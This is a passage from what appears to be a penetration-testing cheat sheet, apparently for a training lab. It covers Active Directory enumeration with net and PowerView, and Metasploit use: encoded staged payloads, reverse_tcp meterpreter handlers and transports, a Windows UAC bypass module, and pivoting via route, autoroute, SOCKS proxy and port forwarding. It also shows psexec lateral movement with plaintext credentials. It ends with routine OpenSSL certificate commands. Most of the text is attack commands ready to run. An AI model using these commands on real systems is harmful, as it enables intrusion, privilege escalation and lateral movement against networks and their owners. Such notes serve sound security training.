htc --forward-port 8080 B.B.B.B:1234

#Now, C is ready to remote desktop to A doing
rdesktop 127.0.0.1:8080

#Again do not forget the SMB v2 config
```

## Active Directory 

### Enumerate groups on local machine
```
net localgroup
```

### Enumerate all domain user, groups
```
net user /domain
#check a particular domain user
net user john_admin /domain

#group enumeration
net group /domain
```

### Get Logged on user
```
Import-Module .\PowerView.ps1
Get-NetLoggedon -ComputerName client251
```

### Get Session 
```
Import-Module .\PowerView.ps1
Get-NetSession -ComputerName dc01
```

## Metasploit

### Generality
```
#Update metasploit 
apt install metasploit-framework

#Scan and add to database
db_nmap 10.11.0.22 -A -Pn

hosts
services -p 445
creds

#workspace
workspace
workspace test
workspace -a/-d ...

#check if target is vulnerable
check

#exploit in backgroud
exploit -j

#list and manage jobs (created by backgroud action)
jobs
jobs -i 0
kill 0

#Set global param with setg
```

### Meterpreter Payloads
```
search meterpreter type:payload

```

### Advanced Features and Transport
```
show advanced
set EnableStageEncoding true #to encode the second code portion of staged payload
set StageEncoder x86/shikata_ga_nai
exploit -j


set AutoRunScript post/windows/manage/migrate #This migrate automatically on a notepad process and run the notepad in background

set AutoRunScript windows/gather/enum_logged_on_users #to be ran immediately after reverse shell is gotten
exploit -j 
```

#### Meterepreter transport 
```
meterpreter > transport list
transport add -t reverse_tcp -l 10.11.0.4 -p 5555
transport list

#use the current new transport set
background
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.11.0.4
set LPORT 5555
exploit -j

sessions -i 5
transport next
sessions -i 6
```

#### windows 10 uac bypass
```
use exploit/windows/local/bypassuac_injection_winsxs
```
#### Pivoting with the Metasploit Framework
```
msf5 > route add 192.168.1.0/24 11
#192.168.1.0/24 is the new network to pivot to and 11 session id
msf5 > route print

#At this step we can now enumerate the subnet
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.110
...

#And obtain even a shell through bind shell
use exploit/windows/smb/psexec
set SMBDomain corp
set SMBUser jeff_admin
set SMBPass Qwerty09!
set RHOSTS 192.168.1.110
msf5 exploit(windows/smb/psexec_psh) > set payload windows/meterpreter/bind_tcp
set RHOST 192.168.1.110
set LPORT 444
exploit
```

##### Auto routing
```
use multi/manage/autoroute
set session 4
exploit
```

##### Routing for socks proxy
```
use auxiliary/server/socks4a
set SRVHOST 127.0.0.1
exploit -j

echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf

proxychains rdesktop 192.168.1.110
```

##### Routing for port forwarding
```
meterpreter > portfwd -h
meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.1.110
rdesktop 127.0.0.1
```

## SSL for http and https
### Generate a certificate authority (CA) cert
```
openssl req -newkey rsa:4096 -keyform PEM -keyout ca.key -x509 -days 3650 -outform PEM -out ca.cer
```

### Generate Apache server SSL key and certificate
```
openssl genrsa -out server.key 4096
openssl req -new -key server.key -out server.req -sha256
openssl x509 -req -in server.req -CA ca.cer -CAkey ca.key -set_serial 100 -extensions server -days 1460 -outform PEM -out server.cer -sha256
rm server.req
```

### Generate a client SSL certificate (Target: browser)
```
openssl genrsa -out client.key 4096
openssl req -new -key client.key -out client.req
openssl x509 -req -in client.req -CA ca.cer -CAkey ca.key -set_serial 101 -extensions client -days 365 -outform PEM -out client.cer
openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
rm client.key client.cer client.req

#Verify wether the client cert is well signed 
openssl verify -verbose -CAfile ca.crt client.cer 
```

### Generate certificate for IIS
```
openssl pkcs12 -inkey server.key -in server.crt -export -out server.pfx
```
